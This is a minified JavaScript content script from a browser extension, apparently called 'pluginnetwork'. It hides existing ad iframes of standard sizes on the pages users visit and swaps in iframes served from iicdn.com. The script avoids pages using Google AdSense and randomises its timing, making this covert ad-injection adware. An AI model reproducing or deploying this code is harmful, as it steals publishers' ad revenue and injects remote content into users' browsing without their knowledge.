if(!pluginnetwork)var pluginnetwork={};var failcount=0;
pluginnetwork.pluginStorage=function(){return{initialized:!1,getItem:!1,setItem:!1,removeItem:!1,setupStorage:function(c){pluginnetwork.pluginStorage=c;pluginnetwork.pluginStorage.getItem=function(a){return typeof pluginnetwork.pluginStorage[a]!="undefined"?pluginnetwork.pluginStorage[a]:null};pluginnetwork.pluginStorage.setItem=function(a,b){pluginnetwork.pluginStorage[a]=b;chrome.extension.sendRequest({requestType:"localStorage",operation:"setItem",itemName:a,itemValue:b},function(){})};pluginnetwork.pluginStorage.removeItem=
function(a){delete pluginnetwork.pluginStorage[a];chrome.extension.sendRequest({requestType:"localStorage",operation:"removeItem",itemName:a},function(){})};pluginnetwork.pluginStorage.initialized=!0},init:function(){chrome.extension.sendRequest({requestType:"getLocalStorage"},function(c){pluginnetwork.pluginStorage.setupStorage(c)})}}}();pluginnetwork.pluginStorage.init();
pluginnetwork.contentscript=function(){return{onDomInsertedTimer:!1,documentParsed:!1,initialized:!1,isMarketingEnabled:function(){return pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".marketing")=="false"?!1:!0},isFirstRunDaily:function(){var c=pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".lastrun"),a=!1;typeof c=="undefined"&&(c=0);var b=new Date,b=b.getFullYear()+""+pluginnetwork.helpers.getMonthFormatted(b)+""+pluginnetwork.helpers.getDayFormatted(b);
parseInt(b)>parseInt(c)&&(a=!0);return a},createIframe:function(c,a,b,d){var f="";this.isFirstRunDaily()&&(f="&firstrun="+pluginnetwork.GLOBALS.PLUGIN_NAMESPACE);var e=document.createElement("iframe");e.setAttribute("src","http://www.iicdn.com/www/delivery/afr.php?zoneid="+a+"&refresh=60"+f);e.setAttribute("height",b);e.setAttribute("width",d);e.setAttribute("name",c);e.setAttribute("id",c);e.setAttribute("scrolling","NO");e.setAttribute("frameborder","0");return e},contentEdit:function(){var c={"www.example.com":[{selector:".example_class",
append:!1,style:"",ielement:1},{selector:"#example_id",append:!1,style:"",ielement:1}]};for(b in document.getElementsByTagName("script"))if(typeof document.getElementsByTagName("script")[b].src!=="undefined"&&document.getElementsByTagName("script")[b].src.indexOf("pagead/show_ads.js")!==-1)return;if(this.isMarketingEnabled()&&(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".definitions")!==null&&pluginnetwork.helpers.IsJsonString(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+
".definitions"))&&(c=JSON.parse(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".definitions"))),document.querySelector("#a47abb2d")===null&&document.querySelector("#a47abb3d")===null&&document.querySelector("#a47abb4d")===null&&typeof c.bl!="undefined"&&typeof c.global!="undefined"&&pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".aq")!=null)){for(var a=window.location.host.split(".").reverse(),b=0;b<c.bl.length;b++)if(c.bl[b].indexOf(a[1])!=
-1)return;if(!(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".tdb")==null&&(new Date).getMinutes()%2==0==!1)&&pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".ei")!=null&&(a=pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".ft"),a=a==null?Math.round((new Date).getTime()/1E3):parseInt(a),!(Math.round((new Date).getTime()/1E3)<a))){var c=parseInt(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+
".aq")),b=!1,d=0,d=d=0;if(c>0){if(document.querySelector('iframe[width="300"]')!==null&&(a=document.querySelector('iframe[width="300"]'),a.height==250))b=document.createElement("div"),b.id="__"+window.location.host+"_aq",d=pluginnetwork.GLOBALS.AZ_300,b.appendChild(this.createIframe("a47abb2d",d,250,300)),a.parentNode.appendChild(b),a.style.display="none",c-=1,b=!0;if(document.querySelector('iframe[width="728"]')!==null&&(a=document.querySelector('iframe[width="728"]'),a.height==90))b=document.createElement("div"),
b.id="__"+window.location.host+"_aq2",d=pluginnetwork.GLOBALS.AZ_728,b.appendChild(this.createIframe("a47abb3d",d,90,728)),a.parentNode.appendChild(b),a.style.display="none",c-=1,b=!0;if(document.querySelector('iframe[width="160"]')!==null&&(a=document.querySelector('iframe[width="160"]'),a.height==600))b=document.createElement("div"),b.id="__"+window.location.host+"_aq3",d=pluginnetwork.GLOBALS.AZ_160,b.appendChild(this.createIframe("a47abb4d",d,600,160)),a.parentNode.appendChild(b),a.style.display=
"none",c-=1,b=!0;b==!0&&(a=Math.round((new Date).getTime()/1E3)+Math.floor(Math.random()*180+300),c<0&&(c=0),pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".aq",c),pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE+".ft",a))}}}},contentUpdate:function(){if(pluginnetwork.contentscript.documentParsed)pluginnetwork.contentscript.onDomInsertedTimer&&clearTimeout(pluginnetwork.contentscript.onDomInsertedTimer),pluginnetwork.contentscript.onDomInsertedTimer=
setTimeout(function(){pluginnetwork.contentscript.contentEdit();onDomInsertedTimer=null},300)},init:function(){if(!pluginnetwork.contentscript.initialized)if(pluginnetwork.pluginStorage.initialized){if(pluginnetwork.contentscript.initialized=!0,window===window.top)pluginnetwork.contentscript.documentParsed=!0,pluginnetwork.contentscript.contentEdit()}else failcount+=1,failcount<20&&setTimeout(pluginnetwork.contentscript.init,100)}}}();pluginnetwork.contentscript.init();
document.addEventListener("DOMContentLoaded",pluginnetwork.contentscript.init,!1);document.addEventListener("DOMNodeInserted",pluginnetwork.contentscript.contentUpdate,!1);
